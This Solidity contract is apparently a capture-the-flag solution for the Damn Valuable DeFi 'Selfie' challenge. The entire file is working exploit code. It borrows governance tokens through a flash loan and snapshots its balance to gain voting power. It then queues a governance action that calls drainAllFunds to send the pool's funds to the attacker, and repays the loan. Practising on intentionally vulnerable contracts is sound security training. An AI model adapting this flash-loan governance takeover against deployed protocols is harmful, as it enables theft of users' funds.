pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker {
    using Address for address;

    address private immutable attacker;
    uint256 public actionId;

    DamnValuableTokenSnapshot private immutable liquidityToken;
    SimpleGovernance private immutable governance;
    SelfiePool private immutable selfiePool;

    constructor(
        address attackerAddress,
        address selfiePoolAddress,
        address governanceAddress,
        address liquidityTokenAddress
    ) public {
        attacker = attackerAddress;

        liquidityToken = DamnValuableTokenSnapshot(liquidityTokenAddress);
        selfiePool = SelfiePool(selfiePoolAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function execute(uint256 amount) external {
        selfiePool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        require(token == address(liquidityToken), "Unexpected tokens received");
        require(
            liquidityToken.balanceOf(address(this)) == amount,
            "Not enough token received"
        );

        liquidityToken.snapshot();

        actionId = governance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );

        // Return the loan
        liquidityToken.transfer(address(selfiePool), amount);
    }
}
